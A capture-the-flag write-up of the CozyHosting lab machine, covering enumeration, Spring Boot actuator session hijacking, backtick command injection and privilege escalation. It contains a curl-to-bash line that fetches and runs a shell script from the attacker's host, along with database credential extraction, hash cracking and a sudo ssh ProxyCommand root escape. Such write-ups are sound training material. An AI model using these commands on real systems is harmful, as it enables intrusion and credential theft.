# CozyHosting

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.121.30           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-04 13:22 +08
Nmap scan report for 10.129.121.30
Host is up (0.16s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Did a detailed scan as well:

```
$ nmap -p 80 -sC -sV --min-rate 4000 10.129.121.30 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-04 13:23 +08
Nmap scan report for 10.129.121.30
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can add this host to our `/etc/hosts` file and start proxying traffic through Burpsuite.&#x20;

### Web Enum --> Spring Boot --> Admin

Port 80 shows a basic corporate site:

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

There is a login function, but weak credentials or basic SQL Injection attacks don't seem to work. I did a `gobuster` directory scan, which revealed a few directories:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://cozyhosting.htb -t 100  
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/09/04 13:26:29 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/admin                (Status: 401) [Size: 97]
/logout               (Status: 204) [Size: 0]
/error                (Status: 500) [Size: 73]
```

When visiting all of these, the `/error` endpoint stood out:

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Whitelabel Error Page means that the website uses Spring Boot, which requires a different method of enumeration. Using something called Actuators, we can query information about the website through HTTP requests:

{% embed url="https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators" %}

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

Using this, we can try to find some custom endpoints that may not be present in any wordlist. We can use the `/actuator/mappings` directory for this:

```
$ curl --silent http://cozyhosting.htb/actuator/mappings | jq
<TRUNCATED>
{
              "handler": "htb.cloudhosting.compliance.ComplianceService#executeOverSsh(String, String, HttpServletResponse)",                                                             
              "predicate": "{POST [/executessh]}",
              "details": {
                "handlerMethod": {
                  "className": "htb.cloudhosting.compliance.ComplianceService",
                  "name": "executeOverSsh",
                  "descriptor": "(Ljava/lang/String;Ljava/lang/String;Ljakarta/servlet/http/HttpServletResponse;)V"                                                                       
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "POST"
                  ],
                  "params": [],
                  "patterns": [
                    "/executessh"
                  ],
                  "produces": []
                }
              }
            },
```

There was one that stood out, which was the `/executessh` one. However, I was not allowed to interact with this service at all, presumably because I am not given permissions as an administrator or something.&#x20;

When checking the `/actuator/sessions` directory, we can find another cookie:

```
$ curl --silent http://cozyhosting.htb/actuator/sessions | jq
{
  "14C4271D66674BA4C3901D6F6C60E76F": "kanderson",
  "DF040098F46C4094515C06D2AA337994": "UNAUTHORIZED"
}
```

Using this cookie, we can access the administrator dashboard:

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

### Admin Dashboard --> RCE

At the bottom of the dashboard, we can see a few fields that take user input and hint that this is the `/executessh` service:

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

When submitting some random values, the browser sends a POST request to `/executessh`, and the error is sent through a GET request:

```http
GET /admin?error=ssh:%20Could%20not%20resolve%20hostname%20test:%20Temporary%20failure%20in%20name%20resolution HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://cozyhosting.htb/admin
Connection: close
Cookie: JSESSIONID=14C4271D66674BA4C3901D6F6C60E76F
Upgrade-Insecure-Requests: 1

```

Seems that the host resolution happens in the website, so let's replace that with `127.0.0.1`. When that happens, the error is `Host key verification failed`. The username part seems to be passed directly into...somewhere.&#x20;

I tried some basic Command Injection using `;` and \`, and found that the latter worked.

```http
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=14C4271D66674BA4C3901D6F6C60E76F

Upgrade-Insecure-Requests: 1



host=127.0.0.1&username=`id`
```

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Using this, we can try to get a reverse shell as the user. When testing random payloads, I managed to trigger an error on the machine as well by typing `{$IFS}` wrongly:

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

The `bash` reverse shell one-liner didn't work and was quite problematic with all of its special characters, so I used a `curl` one-liner instead.&#x20;

```bash
curl${IFS}10.10.14.22/shell.sh|bash
```

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### CloudHosting Jar --> SQL + User Creds

The `app` user has access to this `.jar` file:

```
app@cozyhosting:/app$ ls
cloudhosting-0.0.1.jar
```

Within the machine, there are other services that are active:

```
app@cozyhosting:/app$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      998/java            
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           - 
```

Port 5432 for PostGreSQL is on, so let's enumerate that next. First, we need to find the user that is using the database, and `pspy64` can do that:

```
2023/09/04 05:55:15 CMD: UID=114  PID=1850   | postgres: 14/main: postgres cozyhosting 127.0.0.1(36120) idle                                                                              
2023/09/04 05:55:15 CMD: UID=114  PID=1845   | postgres: 14/main: postgres cozyhosting 127.0.0.1(55606) idle                                                                              
2023/09/04 05:55:15 CMD: UID=114  PID=1817   | postgres: 14/main: postgres cozyhosting 127.0.0.1(50134) idle                                                                              
2023/09/04 05:55:15 CMD: UID=114  PID=1811   | postgres: 14/main: postgres cozyhosting 127.0.0.1(50126) idle
```

A user with UID 114 is using it, and the `/etc/passwd` file has that:

```
app@cozyhosting:/app$ cat /etc/passwd | grep 114
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

`postgres` is using the database. However, this user still requires a password:

```
app@cozyhosting:/app$ psql -U postgres -h localhost -W
Password: 
psql: error: connection to server at "localhost" (127.0.0.1), port 5432 failed: FATAL:  password authentication failed for user "postgres"
connection to server at "localhost" (127.0.0.1), port 5432 failed: FATAL:  password authentication failed for user "postgres"
```

The password might be within the `cloudhosting` jar file, so I downloaded it to my machine via `nc`. Instead of unzipping the entire `.jar` file, we can use `zipgrep` to extract certain information from it.

```
$ zipgrep password cloudhosting.jar  
grep: (standard input): binary file matches
grep: (standard input): binary file matches
grep: (standard input): binary file matches
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-fill:before { content: "\eecf"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-line:before { content: "\eed0"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-fill:before { content: "\eecf"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-line:before { content: "\eed0"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-fill"
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-line"
grep: (standard input): binary file matches
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-fill">
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-line">
grep: (standard input): binary file matches
BOOT-INF/classes/templates/login.html:                                        <input type="password" name="password" class="form-control" id="yourPassword"
BOOT-INF/classes/templates/login.html:                                        <div class="invalid-feedback">Please enter your password!</div>
BOOT-INF/classes/templates/login.html:                                    <p th:if="${param.error}" class="text-center small">Invalid username or password</p>
BOOT-INF/classes/application.properties:spring.datasource.password=Vg&nvzAQ7XxR
grep: (standard input): binary file matches
```

The above password works and we can login to the database:

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Afterwards, we can enumerate this database. There are a few databases available:

```
postgres=# select datname from pg_database;
 ESC[H   datname   
-------------
 postgres
 cozyhosting
 template1
 template0
```

Using the `cozyhosting` database, we can find a `users` table:

```
cozyhosting=# \d
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
```

When we extract all data from it, we get 2 hashes:

```
cozyhosting=# select * from users;
   name    |                           password                           | role
  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

We can crack one of these hashes using `john`:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
1g 0:00:00:14 DONE (2023-09-04 14:02) 0.07062g/s 198.3p/s 198.3c/s 198.3C/s catcat..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The user in the machine is called `josh`:

```
app@cozyhosting:/app$ ls /home
josh
```

Using this password, we can `ssh` in as `josh`:

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

### Sudo Privileges --> Root

Since we have the user's password, we can check our `sudo` privileges:

```
josh@cozyhosting:~$ sudo -l                                                                  
[sudo] password for josh:                                                                    
Matching Defaults entries for josh on localhost:                                             
    env_reset, mail_badpass,                                                                 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty                                                                                  

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

Using the command on GTFOBins, we can spawn a `root` shell:

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Rooted!&#x20;
